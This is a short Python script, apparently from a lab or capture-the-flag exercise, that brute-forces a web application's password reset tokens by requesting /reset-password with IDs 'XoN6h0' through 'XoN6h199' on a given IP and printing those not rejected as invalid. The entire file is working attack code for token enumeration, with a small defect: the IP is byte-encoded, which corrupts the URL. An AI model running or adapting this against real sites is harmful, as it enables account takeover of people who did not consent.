import requests
import sys

if (len(sys.argv) != 2):
    raise Exception('Syntax: python3 program.py ip_address')

ip_address = sys.argv[1].encode('utf-8')

for i in range(200):
    r = requests.get(f'http://{ip_address}/reset-password?id=XoN6h' + str(i))
    if 'Password reset ID is invalid' not in r.text:
        print(i)
